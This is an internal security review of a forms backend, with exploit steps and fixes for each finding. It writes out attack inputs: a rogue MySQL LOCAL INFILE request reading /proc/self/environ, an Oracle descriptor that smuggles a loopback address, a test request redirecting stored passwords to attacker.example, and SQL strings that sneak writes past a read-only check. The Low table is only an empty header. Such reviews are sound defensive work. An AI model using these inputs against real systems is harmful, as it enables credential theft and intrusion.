# Security review (B17, 2026-10-12)

## What this review covers

- **Scope:** the code of formlyBackend as it stood on 2026-10-12 (commit `ff378a2b` plus the working tree that day).
- **Method:** read only. Nothing in the application was changed, no tests were run, and no network or customer systems were touched.
- **Moving code:** another helper was editing edge trust, the gateway entry point and a `close_at` task while this was written (`app/core/middleware/request_context.py`, `tenant.py`, `envelope.py`, `api_host.py`, `app/gateway.py`, `app/modules/public/edge.py`, migration 0035). Line numbers in those files may have moved, so check them again before fixing.

**How findings were kept or dropped:**
- Each finding was confirmed by reading the code it cites.
- Anything that could not be shown from the code is under "To check".
- Every Critical and High finding was re-read a second time against the source, and for C1 against the installed driver.

**Severity scale:**

| Severity | Meaning |
| --- | --- |
| Critical | Takeover of Formalie itself, or reading all customers' secrets, by an ordinary signed-up user |
| High | Crossing an important trust line, for example from member to owner, or reaching Formalie's private network or a customer's stored credentials |
| Medium | A real weakness that needs a second condition, insider access, or gives limited reach |
| Low | Defence in depth, or small leaks |
| Info | Notes for the doc or the operations side |

## Summary

| # | Severity | Title |
| --- | --- | --- |
| C1 | Critical | A rogue MySQL server can read any file on Formalie's servers (LOAD DATA LOCAL INFILE) |
| H1 | High | Data source connections reach Formalie's private network; the address check can be bypassed (DNS rebinding, Oracle descriptors) |
| H2 | High | A role with only `data.view` can send a saved connection's stored password to its own server |
| H3 | High | An Admin can take over the Owner account through the workspace's own SMTP server |
| M1 | Medium | The 5-attempt limit on sign-in and reset codes can be raced, and resend resets it |
| M2 | Medium | An authenticator app can always be bypassed with an email code |
| M3 | Medium | "Forgot password" does not end existing sessions |
| M4 | Medium | A support session in write mode can create access that outlives the consent |
| M5 | Medium | `APP_ENV` fails open: email verification codes are returned in API replies outside production |
| M6 | Medium | The app's own DB role can call the platform admin functions (un-suspend, change plan, read any tenant) |
| M7 | Medium | The Query editor's "read" path can run changes on SQL Server and MySQL / MariaDB |
| M8 | Medium | The request log keeps decrypted bodies (answers, secret header values) with no retention |
| M9 | Medium | Tokens in URL paths (invites, resume drafts, file links) are written to the logs |
| M10 | Medium | The API request log stores `client_secret` and issued access tokens when bodies are kept |
| M11 | Medium | Platform staff can read answers through `audit_logs.changes` |
| M12 | Medium | Whole request bodies are buffered in memory before any rate limit |
| M13 | Medium | Outgoing calls (webhooks, SSO fetches) have no size cap and no total time limit |
| M14 | Medium | `CF-Connecting-IP` is believed as it arrives; Nginx does not overwrite it |
| M15 | Medium | IPv6 callers get a rate-limit counter per address, not per /64 |
| M16 | Medium | Webhook deliveries are not signed (a fixed bearer token, no timestamp) |
| L1 to L22 | Low | See the Low section |
| I1 to I12 | Info | See the Info section |

## Status (2026-10-12, after the fixes)

Fixed in migrations 0036 (security) and 0037 (query review). Every fix has a regression test; the full suite is green.

| # | Status | How |
| --- | --- | --- |
| C1 | ✅ fixed | `app/modules/data_sources/drivers.py`: aiomysql's LOCAL INFILE handler replaced at import (an empty reply, nothing opened, the query fails); refuses to run if the driver changes shape. Connections drop CLIENT_LOCAL_FILES and CLIENT_MULTI_STATEMENTS. asyncpg always gets a password (no `.pgpass`), Oracle descriptors are written by Formalie (no tnsnames, wallets, proxies), SQL Server gets an address (no FreeTDS alias). PyMySQL 1.2.3 already refuses. Test: a fake MySQL server asks for a file (`tests/core/test_datasource_hardening.py`). Point 3 (a separate worker user) is a deployment item in PRODUCTION-CHECKLIST |
| H1 | ✅ fixed | One blocklist (`outbound.blocked`: `not is_global`, multicast, 6to4, NAT64, relay anycast) for mail, SSO, webhooks and data sources; drivers connect to the checked address with the name kept for TLS (`NamedTLSContext`); SSH to the checked address; Oracle descriptors parsed (one address, no extras); private networks only through SSH; `*_ALLOW_LOCAL` only in development and tests; SSH host keys pinned on the first good test (`datasources.ssh_host_key`), a changed key is `FRM-DEST-1004` `host_key_changed` (also L13) |
| H2 | ✅ fixed | `POST /datasources/test` with a saved connection needs `data.edit` on it; stored secrets reused (test and PATCH) only for the same host, port, instance, descriptor, user and SSH server and user; weaker TLS than the saved connection's is refused while they are reused (`FRM-DEST-1003`). Weak modes the connection already had stay allowed (no new exposure). Test: `tests/db/test_datasource_security.py` |
| H3 | ✅ fixed | Codes, reset, invitation, activation, respondent code and resume mail always through Formalie's relay with Formalie's wording; `/settings/emails/sending` in `SUPPORT_NEVER` |
| M1 | ✅ fixed | Redis `INCR` per challenge before comparing; resend keeps the count; one success per code (`SET NX`) |
| M2 | ✅ fixed | With an authenticator app, `channels: ["totp"]`; resend to another channel `FRM-AUTH-1008` `not_offered`; recovery codes stay. Same response shape |
| M3 | ✅ fixed | Reset revokes every session in the same transaction, audited |
| M4 | ✅ fixed | Support sessions (write mode too) can't change people, invitations, roles, API tokens and services, webhooks, workspace, security, sign-in or address settings, or create or change connections and storage (`not_in_support_sessions`); the sign-up link reads empty |
| M5 | ✅ fixed | `APP_ENV` defaults to production; staging and production refuse to start without their keys or with `*_ALLOW_LOCAL` on; `dev_*` only with exactly `development`; docs, debug headers and local switches only in development and tests |
| M6 | ✅ fixed | New login role `formalie_admin_api` (`DB_ADMIN_API_URL`, member of `formalie_app`) is the only one with EXECUTE on the four admin functions; the portal's suspension reason uses `platform.current_suspended_reason()` |
| M7 | ✅ fixed | Engine-aware second check (`sql_guard.read_is_safe`): MySQL `#` and backslash escapes (both sql_modes), executable comments, PostgreSQL `E''` and nested comments, T-SQL batches; a failing "read" takes the change path. MySQL without multi-statements and READ ONLY must start; PostgreSQL changes always prepared. The shared parity rules are unchanged |
| M8 | ✅ fixed | Per-route body policy (names only on answer and secret routes, none for uploads), masking by name, value pattern and `name` / `value` pairs; `request_logs` retention 30 days by dropping partitions (`platform.drop_expired_partitions`) |
| M9 | ✅ fixed | Path tokens masked from the route template (and a fallback before routing); also in the JSON log lines |
| M10 | ✅ fixed | No bodies for the token address; a fixed mask list in `record_call` |
| M11 | ✅ fixed | `platform_reader` no longer reads `audit_logs.changes` and `metadata` (grants.py and its CI test) |
| M12 | ✅ fixed | `REQUEST_BODY_MAX_BYTES` (2 MB) answered `413 FRM-FILE-1002` before buffering; the request log keeps only its limit as bytes stream; uploads exempt with their own limit, collected in a bytearray. The IP limit stays where it is: nothing outside it reads a body any more |
| M13 | ✅ fixed | Outgoing replies streamed with a cap (1 MB, webhooks 64 KB) and a total limit (15 s, inside the 120 s lease) |
| M14 | ✅ fixed | DEPLOYMENT-GUIDE Part 6: Nginx overwrites `CF-Connecting-IP`, clears `CF-IPCountry` from non-Cloudflare peers and the client-certificate headers on public listeners, Authenticated Origin Pulls. The app now prefers the last `X-Forwarded-For` hop Nginx writes; the edge path takes the Worker's hop only with the secret |
| M15 | ✅ fixed | One `ip_bucket()`: IPv6 counted per /64 in every per-IP limit (middleware, route limits, gateway, public form limits) |
| M16 | ⏸ owner decision | Webhook signing changes the 2026-10-06 decision; not changed |
| L1 | ⬜ open | Needs a peek-only limiter (count failures only); not cheap |
| L2 | ✅ fixed | Dummy hash for accounts without a password |
| L3 | ⬜ open | Equal work for unknown addresses needs the mail moved after commit; not cheap |
| L4 | ✅ fixed | Resend refuses another workspace's challenge (`FRM-AUTH-1003`) |
| L5 | 🟡 partly | TOTP steps single use and recovery codes claimed atomically; refresh rotation left (two tabs refreshing together would sign one out, needs a frontend lock) |
| L6, L7, L8 | ⬜ open | Browser-bound OAuth / SSO state, linking after verification, SAML replay: touch the sign-in flows and need testing against real providers |
| L9 | 🟡 mitigated | Every respondent file now has a sandbox CSP; a real SVG sanitiser needs a dependency (owner) |
| L10 | ✅ fixed | Inline only for previewable types, sandbox CSP on every file |
| L11 | ✅ fixed | Export links fail closed without Redis, check `deleted_at`, and the localhost / bare-address exception is development only |
| L12 | ✅ fixed | ASCII `filename=` plus `filename*=UTF-8''` (`app/core/disposition.py`) |
| L13 | ✅ fixed | With H1 (pinned SSH host keys) |
| L14 | ✅ fixed | Sliding window in one MULTI round trip (fakeredis has no Lua); auth and code routes fail closed |
| L15 | ✅ fixed | Nginx returns 404 for `/api/v1/internal/`; `INTERNAL_TOKEN` retired (empty refuses both routes) |
| L16 | ⬜ open | The request log's INSERT policy: the batch writer has no workspace context; needs the writer moved to the worker role |
| L17 | ⏸ owner decision | Separate keyrings per purpose means a key rotation plan |
| L18 | ✅ fixed | `hide_parameters=True` on every engine |
| L19 | ⬜ open | Per-recipient caps and a suppression list are a product rule |
| L20 | ✅ fixed | Control characters refused in single-line email settings |
| L21 | ⬜ open | Changes the gateway's documented check order and the mock's answers |
| L22 | ⬜ open | Changes the unsubscribe token format already in sent mail |
| I3 | ✅ fixed | One blocklist |
| I6 | ✅ fixed | Body sizes per Nginx location (DEPLOYMENT-GUIDE) |
| I12 | ✅ gone | The gateway answers normally (its tests pass) |
| Other Info | ⬜ open | Doc or operations notes, kept as written |

Query review (`2026-10-query-review.md`): I1 to I5 and I8 created (I6, I7, I10 wait for `pg_trgm`); Q2 and Q3 in bounded SQL; Q1 partly (lists filtered, sorted and paged in SQL except search, answer filters and the respondent sort; insights and exports still in memory, plan in PROGRESS); Q11 moved to Beat; Q12 `processed_events` pruned after 7 days (the batched relay update is still open); Q4 to Q10 and Q13 open.

The two fixes that matter most:
- **C1 and H1:** the data source connector is the one place where a tenant chooses the far end of a database protocol. It needs the same care the HTTP path already gets in `app/core/outbound.py`.
- **H3, M1 and M2:** sign-in codes must always travel through Formalie's own channel and be counted atomically.

---

## Critical

### C1. A rogue MySQL server can read any file on Formalie's servers

**Where:**
- `app/modules/data_sources/connect.py:344-355`: `aiomysql.connect(..., init_command=f"SET time_zone = ...")`.
- In the installed driver `fmly/Lib/site-packages/aiomysql/connection.py` (aiomysql 0.2.0):
  - `MySQLResult.read()` (about line 1162) calls `_read_load_local_packet()` whenever the server answers with a LOCAL INFILE request.
  - `LoadLocalFile._open_file()` (about line 1362) then does `open(filename, 'rb')` on whatever name the server sent, and streams the bytes back.
  - `local_infile=False` (the default) only stops the client from *advertising* the capability (line 249). It does not refuse the server's request.
- `connect()` runs `init_command` as a query, so this happens while connecting, before any probe query.
- Nothing in `app/` refuses the request (searched for `local_infile` and `LoadLocal`).

**Exploit:**
1. Anyone signs up, which makes them the Owner of a new workspace on a plan that has data sources.
2. They add a MySQL or MariaDB connection to a host they run, using one of the public "rogue MySQL server" tools, and press Test (or wait for a destination push or a query run).
3. The server answers `SET time_zone` with a LOCAL INFILE request for `/proc/self/environ`, `/srv/formalie/current/.env` or similar.
4. Those files hold `FERNET_KEYS`, the `ID_REF_*` keys, the database URLs and passwords, `INTERNAL_TOKEN` and the platform HMAC keys.

With those, they can forge access and support tokens for any workspace, decrypt every stored secret (`*_enc` columns), and connect to the database directly if it is reachable (see H1).

**Fix:**
1. Before any MySQL connect, make the handler refuse. Patch `aiomysql.connection.MySQLResult._read_load_local_packet` (or subclass the connection's result class) so it sends an empty packet and raises `OperationalError` without opening anything. Do it once at import in `connect.py`.
2. Add a regression test with a fake server that answers the first query with a `0xFB` packet.
3. Run data source work (tests, explorer, query, destination pushes) in a separate Celery worker under a system user that cannot read `.env`, with only the keys it needs in its environment. The data source worker needs the Fernet keys to open `secrets_enc`, so also consider a separate keyring for those (L17).
4. Check `PyMySQL` 1.2.3, which is pinned too. Recent PyMySQL releases refuse LOCAL INFILE unless `local_infile=True`, but confirm the same for the installed version if it is ever used for customer databases.

---

## High

### H1. Data source connections reach Formalie's private network, and the address check can be bypassed

**Where:**
- **The blocklist misses private ranges.** `app/modules/data_sources/connect.py:60-65` (`_blocked_ip`) blocks loopback, link-local, multicast, unspecified, reserved and 100.64/10, but **not** `is_private` (10/8, 172.16/12, 192.168/16, fc00::/7). `engines.py:196-208` (`is_blocked_host`) has the same gap.
  - `app/core/outbound.py:39` does block private ranges, for webhooks, SMTP and identity provider fetches.
  - Decision 111 and API-CONTRACT say private networks go through an SSH tunnel.
- **The checked address is thrown away.** `connect.py:390-399`: `connect()` calls `resolve(host, port)` and discards the result. `_open()` then gives the **name** to asyncpg, aiomysql, pymssql or oracledb, and each resolves it again. The SSH tunnel does the same with `ssh_host` (lines 113-119).
- **Oracle "descriptor" mode skips the check.** `connect.py:372-373` uses the raw descriptor as the DSN, and `resolve()` only runs `if host`, which is empty in this mode. `probe.py:185-189` checks only the first `HOST=` (regex in `engines.py:263-267`), so a second `ADDRESS` in an `ADDRESS_LIST` is never checked. Explorer, query and destination pushes do no check at all.

**Exploit:**
- A workspace admin, or anyone with `data.view` through `/datasources/test` (see H2), sets the host to `10.0.0.5:5432`, Formalie's PostgreSQL or PgBouncer on the private network in DEPLOYMENT-GUIDE.
  - Test answers that differ by step (FRM-DEST-1001, 1002, 1011) plus timing turn "Test connection" into a port scanner of the private network.
  - The same path allows password guessing against `postgres` or `formalie_app` on the internal database (20 tests per minute per IP).
- **DNS rebinding:** a name with TTL 0 answers a public IP to the check and `127.0.0.1` to the driver, which reaches loopback services such as a local PgBouncer or Redis.
- **Oracle:** `(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=tcp)(HOST=public.example)(PORT=1521))(ADDRESS=(PROTOCOL=tcp)(HOST=127.0.0.1)(PORT=6432)))...)` passes the probe and then connects to loopback.

**Fix:**
1. Use one shared check everywhere: `outbound.blocked()`, extended to refuse anything where `not ip.is_global` (that also covers 198.18/15, 192.0.0/24 and 6to4 `2002::/16`, see I3).
2. Connect each driver to the **checked IP**:
   - pass `host=<address>`;
   - keep the name for TLS (asyncpg `ssl` with `server_hostname`, aiomysql `ssl` context `server_hostname`, oracledb `ssl_server_cert_dn`);
   - pass the IP to asyncssh, with the name for the host-key lookup.
3. Oracle: accept only host, port, service name or SID fields and build the descriptor yourself, or parse the descriptor and refuse more than one `ADDRESS`, `ADDRESS_LIST`, `HTTPS_PROXY` or any directory or wallet option. Check `service_name` / `sid` against `^[A-Za-z0-9_.$#-]+$` (they are pasted into the descriptor, `connect.py:375-376`).
4. Keep private networks only through the SSH tunnel, as the contract says, and pin SSH host keys (L13).

### H2. A role with only `data.view` can send a saved connection's stored password to its own server

**Where:**
- `app/modules/data_sources/router.py:140-161` (`POST /datasources/test`).
- Its permission is `data.view` (`app/modules/rbac/permissions.py:208`), and `require_admin` honours a route's own permission when it has one (`auth/sessions.py:280-289`).
- The handler loads `saved` by `datasource_id` with only a tenant check (`_find`, lines 90-97), then merges the stored secrets (`kept = ... open_secrets(saved.secrets_enc)`) with **new settings from the request**: host, port and `ssl_mode`.

**Exploit:**
1. A member whose custom role has `data.view` (for example an analyst) sends `{engine: "postgresql", datasource_id: <the production connection>, settings: {host: "attacker.example", port: 5432, ssl_mode: "disabled", ...}, secrets: {}}`.
2. Their PostgreSQL server asks for `AuthenticationCleartextPassword`, and asyncpg sends the stored password in plain text. MySQL `mysql_clear_password` works the same way.
3. They now hold the customer's production database credentials, which the API treats as write-only.

`PATCH /datasources/{id}` (lines 298-314) has the same "keep the stored secrets when the host changes" behaviour, but it requires `data.edit` on that connection.

**Fix:**
1. When a test names a `datasource_id`, require `data.edit` with its scope on that connection (`owned_reach("data.edit", saved.created_by, principal)`).
2. In both test and PATCH, reuse stored secrets **only** when host, port, SSH host, descriptor and username are all unchanged; otherwise require the secrets again.
3. While stored secrets are reused, refuse TLS modes below `required`.

### H3. An Admin can take over the Owner account through the workspace's own SMTP server

**Where:**
- `app/modules/emails/sending.py:90-103` (`route_for`): when the workspace's sending mode is `smtp` and the server tested "working", **every** workspace email goes through it.
- `app/modules/auth/router.py:113-125` (`_send_code`) sends sign-in and reset codes through `workspace_mail.send`, and `app/modules/emails/workspace.py:166` uses `route_for`. The forgot / reset flow is at `router.py:503-574`.
- Changing the sending settings needs `settings.manage` (`rbac/permissions.py:242`), which the built-in Admin role has (`rbac/catalogue.py:390`).
- `people/router.py:158-164` (`guard_owner`) exists exactly to stop Admins acting on the Owner.

**Exploit:**
1. An Admin points `PUT /settings/emails/sending/smtp` at a mail server they run, and the connection test marks it "working".
2. They call `POST /auth/password/forgot` with the Owner's email and read the reset code on their own server.
3. They set a new password, sign in, and read the sign-in code the same way. If the Owner uses an authenticator app, M2 lets them switch the challenge to email.
4. They now hold a full Owner session.

A support session in write mode can do the same, because `SUPPORT_NEVER` (`platform_bridge/support.py:47`) does not cover `/settings/emails`.

**Fix:**
1. Security mail always goes through Formalie's own relay, whatever the workspace's sending mode: sign-in codes, password reset, find-my-workspace, sign-up codes, activation and invite links, and respondent verification codes.
2. For those templates, ignore workspace custom text, or keep it but refuse a body that puts `{{code}}` inside a link or image address (see "To check" 4).
3. Add `/settings/emails/sending` to `SUPPORT_NEVER`.

---

## Medium

### M1. The 5-attempt limit on codes can be raced, and resend resets it

**Where:**
- `app/modules/auth/challenges.py:139-154` (`verify_code`) reads the challenge JSON from Redis, compares the code, then `_wrong()` (lines 130-136) writes back `attempts + 1`. The read, compare and write are not atomic.
- `resend()` resets `attempts` to 0 (line 169), up to 3 times.

**Exploit:**
- An attacker requests a reset code for a victim.
- They send guesses in parallel bursts from many addresses (per-IP limits are 20 per minute on `/auth/otp/verify` and 10 per minute on `/auth/password/reset`; with IPv6 see M15). Each burst reads the same `attempts` value, so a whole burst counts as one attempt.
- Over the 5-minute life of the code, this multiplies the guesses far beyond 5 (and by 4 again with resends).
- It applies to:
  - the second factor at sign-in (when the password is known);
  - password reset;
  - sign-up verification (after which `GET /auth/signup/workspaces` lists that email's workspaces);
  - find-my-workspace.

**Fix:**
1. Count the attempt **before** comparing: `INCR fm:v1:auth:ch:{id}:attempts` (or a Lua script that does check, increment and compare in one go), and refuse once it passes the maximum.
2. Do not reset attempts on resend; keep one total per challenge.
3. Consume the challenge atomically on success (`GETDEL`).
4. Add a per-email limit on verify.

### M2. An authenticator app can always be bypassed with an email code

**Where:**
- `app/modules/auth/router.py:198` always offers `email` among the channels, even when the user has a confirmed authenticator.
- `challenges.py:157-167` (`resend(channel="email")`) switches channel, with no wait when leaving TOTP.

**Exploit:** anyone with the password and access to the mailbox (or to the mail route, see H3) never needs the authenticator. Turning on two-step with an app adds nothing over email codes.

**Fix:**
- When a confirmed TOTP exists, offer `totp` only; recovery codes already work there.
- Allow email only through an explicit, audited recovery path, and never for Owners and Admins.

### M3. "Forgot password" does not end existing sessions

**Where:** `app/modules/auth/router.py:566-573` sets the new `password_hash` but never calls `revoke_sessions`.
- `/me/password` does revoke sessions (`app/modules/people/me.py:198`).
- SECURITY-PROTOCOL §5 says password changes revoke sessions.

**Exploit:** someone with a stolen refresh cookie keeps their session (up to 7 days through refresh) after the victim resets the password because they suspected exactly that.

**Fix:** in the same transaction, revoke every session of that user (`revoke_sessions(db, tenant.id, ..., user_id=user.id, reason="password_reset")`) and audit it.

### M4. A support session in write mode can create access that outlives the consent

**Where:** `app/modules/platform_bridge/support.py:47`. `SUPPORT_NEVER` only blocks `/me/`, the support-access settings, `/privacy/`, `/settings/sso` and `reveal` / `secret` paths.

**Exploit:** staff in a write-mode session (or anyone who steals that support token) can do any of the following:
- `POST /people` with an email they control, then `POST /people/{id}/invite/link`, which returns the activation link directly (`app/modules/people/invites.py:247-255`);
- turn on the shared sign-up link and approve themselves;
- create API tokens or webhooks;
- change the mail route (H3).

That access remains after the consent ends. Even read mode can `GET /people/signup-link`, which returns the decrypted join link (`invites.py:299`).

**Fix:**
- In support sessions, refuse people creation, invites and invite links, approvals, sign-up link changes, role changes, `/settings/emails/sending`, `/settings/security`, and API token, webhook and data source creation.
- Hide the sign-up link token from support reads.

### M5. `APP_ENV` fails open: email verification codes are returned in API replies outside production

**Where:**
- `app/core/config.py:21` defaults `app_env` to `development`.
- The following are gated on `not is_production`:
  - `public/router.py:241` returns `dev_code`, the respondent's email verification code, in the reply;
  - `public/router.py:332, 353` return `dev_resume_url`;
  - `links/invites.py:80` returns `dev_links`;
  - docs are switched on, and the `*_ALLOW_LOCAL` flags are honoured (`app/core/outbound.py:44`);
  - `X-Debug-Country` / `X-Debug-Network` are honoured on the gateway (`api_service/callers.py:129-143`).
- `staging` counts as "not production", so staging always does this.
- Nothing refuses to start with `APP_ENV` missing.

**Exploit:** on staging, or on production with `APP_ENV` unset or misspelled:
- anyone can pass any form's "verify your email" step by reading `meta.dev_code`;
- `/docs` and `/openapi.json` are public;
- the gateway's country and network rules can be bypassed with a header;
- local addresses become reachable for webhooks and SSO.

**Fix:**
1. Default `app_env` to `production`.
2. Gate every development convenience on `is_development` (development or test), never on `not is_production`.
3. Refuse to start in staging or production without explicit `APP_ENV`, `FERNET_KEYS`, `ID_REF_*`, the broker and Redis credentials, and the internal secrets.

### M6. The app's own DB role can call the platform admin functions

**Where:**
- `alembic/versions/0034_platform_bridge.py:433-497, 543-548`: `platform.admin_set_status`, `admin_set_plan`, `admin_tenant(uuid)` and `communication_workspaces()` are SECURITY DEFINER, owned by `formalie_owner`, and EXECUTE is granted to `formalie_app`.
- They act on "the workspace in `app.tenant_id`", which the caller sets itself, or, for `admin_tenant` and `communication_workspaces`, on any tenant.
- `0001_foundation.py:48` says `platform.tenants` is never readable by `formalie_app`.

**Exploit:** any SQL execution primitive in portal code becomes "un-suspend my workspace, give it any plan and limits, and list every workspace" (`SELECT platform.admin_set_plan('enterprise', ...)`). No such primitive is known today: every query is bound or allow-listed (see "Done well"). This finding is about removing the blast radius.

**Fix:** give the internal admin API its own login role (for example `formalie_admin_api`, with its own engine and URL), grant these functions only to it, and revoke them from `formalie_app`.

### M7. The Query editor's "read" path can run changes on SQL Server and MySQL / MariaDB

**Where:**
- The one-statement rule and the read / change classification are in `app/modules/data_sources/sql.py:29-65` (`_mask`) and `133-150` (`statement_kind`), used by `app/modules/query/router.py:150-163`.
- **SQL Server:**
  - T-SQL needs no `;` between statements, so `SELECT 1 UPDATE dbo.t SET ... COMMIT` is one "read".
  - `runner.py:180-192` runs the batch with no read-only transaction, and the final `rollback()` does not undo a `COMMIT` inside the batch.
- **MySQL:**
  - aiomysql always sets `CLIENT.MULTI_STATEMENTS` (`aiomysql/connection.py:253`), and the splitter ignores `#` comments.
  - So `SHOW TABLES # '` + newline + `; COMMIT; UPDATE t SET ...` is one statement to the splitter and several to MySQL.
  - The `START TRANSACTION READ ONLY` failure is swallowed (`runner.py:171-174`).
- **PostgreSQL:** `E'\''` strings and nested `/* */` comments hide statements from the splitter. The change path uses the simple protocol, which allows several statements (`runner.py:230`).

**Impact:**
- A workspace member with only `data.query_read` can change the customer's database.
- They bypass the connection's "Read only" setting (FRM-DEST-1024), the guard on Formalie's response tables (FRM-DEST-1019) and the confirm step, and are audited as a read.
- This is limited to the customer's own database, never Formalie's.

**Fix:**
- Make the splitter engine-aware (`#`, backslash escapes, `E''`, nested comments).
- Run MySQL reads on a connection opened without `MULTI_STATEMENTS`.
- On SQL Server, refuse batches with more than one statement using `sp_describe_first_result_set` / a parse step, or run reads under a read-only login.
- Use the extended protocol (asyncpg `prepare`) for every PostgreSQL statement.

### M8. The request log keeps decrypted bodies (answers, secret header values) with no retention

**Where:**
- `app/core/middleware/request_log.py:143-145` passes `ctx.decrypted_payload` to `body_record`.
- `app/modules/logs/capture.py:69-131` masks only keys whose **name** contains a sensitive word (`app/core/logging/setup.py:27-31`).

**What is kept in clear:**
- Respondents' answers from the public submit and draft saves. Field keys are chosen by form builders, so `iban`, `passport_number` and `diagnosis` are not masked.
- API endpoint secret header values (`headers[].value`, `api_service/router.py:70`), which the database itself stores encrypted (`value_enc`).
- "Try it" custom headers (`try_router.py:43`) and the unsubscribe `t` value.

`request_logs` is insert-only and no purge task exists (`app/core/db/tasks.py` only creates partitions), so a privacy erasure never reaches these copies.

**Exploit:** anyone with database or backup access (DBAs, a leaked backup, `platform_reader`, see M11) reads answers and shared secrets.

**Fix:**
1. Use a per-route body policy instead of a denylist: field names only, never values, for `/public/forms/*`, `/responses/*`, `/api-service/*` and the gateway.
2. Mask `value` wherever a sibling `name` exists.
3. Add a retention job that detaches and drops `request_logs` partitions older than the documented period, and mention it in the privacy policy.

### M9. Tokens in URL paths are written to the logs

**Where:**
- `request_log.py:136, 178` stores the raw `path`.
- `app/core/logging/setup.py:83-84` adds `ctx.path` to every JSON log line.
- Query strings are masked; path segments are not.

**Tokens affected:**
- `/public/invites/{token}` and `/accept`: activation and invites, valid 7 days. Accepting sets the account's name and password.
- `/public/forms/{key}/sessions/{token}`: resume drafts, 30 days, which expose the draft answers.
- `/response-files/{token}`: reusable for 5 minutes.
- The single-use export links.

**Exploit:** a log reader, or a leaked 90-day log file, opens a pending invite and sets the invitee's password, or reads a respondent's draft.

**Fix:**
- Before recording, replace path parameters named `token`, `code` or `ticket` with `***`, using the route template (already known as `route_template`).
- Do the same for `ctx.path` in the JSON formatter.

### M10. The API request log stores `client_secret` and issued access tokens when bodies are kept

**Where:**
- `app/modules/api_service/gateway.py:278-290` (`_log`) keeps the request and response bodies of every non-upload call, including `POST /{apiKey}/token` (lines 352-363).
- `traffic.py:128-147`: with `log_keep_bodies` on, `mask_answers(..., personal=set())` masks nothing in that body.

**Exploit:** an admin switches body logging on. From then on, `client_secret` (a long-lived credential) and every issued `access_token` (up to 60 minutes) sit in clear in `api_request_logs`, readable in the portal's API log. SECURITY-PROTOCOL §9 says request logs never store tokens.

**Fix:**
- Never keep bodies for the token address.
- Add a fixed mask list (`client_secret`, `access_token`, `password`, `token`, `secret`) to `record_call`.

### M11. Platform staff can read answers through `audit_logs.changes`

**Where:**
- `app/modules/responses/router.py:385, 397-399` write edited answers' `before` / `after` values into `audit_logs.changes`.
- `app/modules/platform_bridge/grants.py:20-40` hides `response_changes.before/after` from `platform_reader`, but has no entry for `audit_logs`.
- `query/router.py:200-201` puts the SQL text into `audit_logs.metadata.statement`, while `query_history.sql` is hidden.

**Exploit:** platform staff read respondents' answers and customers' SQL through the audit columns, against the rule "platform_reader never reads answers" (DATABASE-DESIGN, DB roles).

**Fix:**
- Store answer edits in the audit row as the field label only (the values stay in `response_changes`), and the SQL as a hash or its first keyword.
- Or hide `audit_logs.changes` and `metadata` from `platform_reader`.
- Extend `tests/db/test_platform_grants.py` accordingly.

### M12. Whole request bodies are buffered in memory before any rate limit

**Where:**
- `app/core/middleware/request_log.py:92-103` keeps every POST, PUT, PATCH and DELETE body in full.
- It sits outside `IpRateLimitMiddleware` (`app/run.py:85-90`), and the same holds on the gateway (`app/gateway.py:131-135`).
- Nginx allows 110 MB on `services.` (DEPLOYMENT-GUIDE).
- `uploads/router.py:57-62` builds uploads with `data += chunk`, which is quadratic.

**Exploit:** without signing in, many parallel 100 MB POSTs to any path are held in RAM before anything refuses them. The API workers run out of memory.

**Fix:**
- Keep only `request_log_body_max_bytes` and drop the rest as it streams.
- Do not buffer `/storage/*` or gateway uploads.
- Put the IP limit outermost.
- In `store_upload`, collect chunks in a `bytearray` and stop at `max_bytes`.
- Lower Nginx's `client_max_body_size` per location to what each route needs.

### M13. Outgoing calls (webhooks, SSO fetches) have no size cap and no total time limit

**Where:**
- `app/modules/webhooks/tasks.py:111-116`: `http.post(...)` reads the whole reply, then keeps `answer.text[:2000]`.
- `app/core/outbound.py:95-97`, used for SSO metadata, discovery, token and JWKS fetches.
- The httpx timeout applies per read, not to the whole call.

**Exploit:** a tenant's receiver returns gigabytes, or drips a byte every 9 seconds. Worker memory runs out, or the delivery outlives its 120 s lease (`webhooks/tasks.py:44`). The sweep then re-claims it and sends it twice, and the shared `webhooks` queue starves.

**Fix:**
- Use `client.stream(...)`, read at most about 64 KB, then close.
- Wrap each call in `asyncio.wait_for` with a total limit below the lease (for example 15 s).

### M14. `CF-Connecting-IP` is believed as it arrives; Nginx does not overwrite it

**Where:**
- `app/core/middleware/request_context.py` (the trusted-proxy branch, about lines 46-51 before the current edits): when the peer is a trusted proxy, `CF-Connecting-IP` wins over everything.
- The Nginx config in DEPLOYMENT-GUIDE (Part 6) sets `real_ip_header` but passes the client's own `CF-Connecting-IP` and `CF-IPCountry` through unchanged. It also does not clear `X-Client-Verify` / `X-Client-Cert-Fingerprint` on the public listeners.

**Exploit:** any request that reaches Nginx without Cloudflare rewriting the header (a firewall gap, another path to the origin, the private listener) can claim any client address. That defeats:
- per-IP rate limits;
- workspace sign-in IP allowlists (`auth/router.py:226`, `auth/sessions.py:244`);
- the API's IP and country rules;
- the audit IPs;
- the network part of the internal admin check (`platform_bridge/internal.py:140`; mTLS and HMAC still apply).

**Fix:**
- In Nginx, after `real_ip`, set `proxy_set_header CF-Connecting-IP $remote_addr;`.
- Clear `CF-IPCountry` unless the peer is Cloudflare.
- Clear the client-certificate headers on public listeners.
- Turn on Cloudflare Authenticated Origin Pulls.
- In the app, prefer the `X-Forwarded-For` hop Nginx itself writes.

### M15. IPv6 callers get a rate-limit counter per address

**Where:** `app/core/middleware/rate_limit.py:206` (`ip:{ip}`), `app/core/security/limits.py:40`, and the gateway (`app/gateway.py:75`, `api_service/gateway.py:376`).

**Exploit:** one IPv6 /64 holds 2^64 addresses, so every per-IP limit, including sign-in, code checks and public submit, is bypassed by rotating addresses. This is what turns M1 from theoretical into practical.

**Fix:** count IPv6 by its /64 (and consider a /48 ceiling).

### M16. Webhook deliveries are not signed

**Where:** `app/modules/webhooks/service.py:53-57` sends the same `formalie_hook_...` bearer token with every delivery; `rules.py:111-113` says deliveries are not signed.

**Exploit:** anyone who sees one delivery (receiver logs, a proxy, a teammate) can forge or replay deliveries for ever. Receivers cannot check the body or its age.

**Fix:**
- Add `Formalie-Timestamp` and `Formalie-Signature: v1=HMAC-SHA256(secret, "{timestamp}.{raw body}")`, with a documented 5-minute window. Keep the bearer header for compatibility.
- This changes the owner's decision of 2026-10-06 (tokens only, no signing) for the *outgoing* direction, so **it needs the owner's approval**.

---

## Low

| # | Where | Problem | Fix |
| --- | --- | --- | --- |
